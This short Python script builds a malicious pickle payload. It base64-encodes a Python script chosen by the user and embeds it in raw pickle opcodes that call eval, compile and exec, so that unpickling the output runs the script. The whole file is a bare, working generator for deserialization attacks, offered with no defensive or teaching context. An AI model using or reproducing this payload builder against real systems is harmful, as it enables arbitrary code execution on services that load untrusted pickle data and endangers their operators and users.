from base64 import b64encode

path = input('Enter python script path>')
try:
    data = open(path, 'rb').read()
except FileNotFoundError:
    print('File not found')
    exit()

data = b64encode(data)

payload = b'c__builtin__\neval\n(c__builtin__\ncompile\n(Vfrom base64 import b64decode;exec(b64decode("' + data + b'").decode())\nV-\nVexec\ntRtR.'
print(payload)
